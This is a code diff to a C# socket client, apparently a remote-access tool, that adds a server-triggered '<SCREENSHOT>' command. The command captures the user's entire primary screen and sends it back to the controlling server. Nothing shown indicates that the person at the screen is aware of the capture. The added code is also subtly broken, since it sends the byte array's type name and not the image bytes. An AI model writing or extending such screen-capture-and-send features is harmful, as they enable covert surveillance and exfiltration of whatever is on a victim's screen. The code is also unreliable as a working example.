@@ -1,4 +1,5 @@
-﻿using System.Net;
+﻿using System.Diagnostics;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using Microsoft.Win32;
@@ -56,6 +57,23 @@ namespace Client.Client
                 GetServerSocket().Close();
                 Application.Exit();
             }
+            else if (tempString.StartsWith("<SCREENSHOT>"))
+            {
+
+                MemoryStream ms = new MemoryStream();
+                GetScreen().Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
+                byte[] b = ms.ToArray();
+                GetServerSocket().Send(Encoding.ASCII.GetBytes("<SCREENSHOT>" + b + "<EOF>"));
+                ms.Close();
+                Debug.WriteLine("ahgw");
+            }
+        }
+        private Bitmap GetScreen()
+        {
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics g = Graphics.FromImage(bitmap);
+            g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            return bitmap;
         }
 
         public void ExecuteClient()
